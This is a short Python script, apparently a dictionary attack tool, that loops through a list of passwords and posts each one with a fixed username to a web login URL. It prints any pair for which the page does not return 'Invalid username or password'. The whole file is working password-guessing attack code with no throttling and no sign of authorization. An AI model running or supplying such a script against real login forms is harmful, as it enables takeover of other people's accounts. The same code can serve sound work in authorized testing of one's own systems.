import requests


def process_pass(url, user, pass_list):

    for password in pass_list:
            
        datas = {}

        datas['username']=user
        datas['password']=password

        
        result = requests.post(url, data=datas)

        response = result.text

        if not response.find('Invalid username or password') > 0 :
            
           print(datas)
     
    return None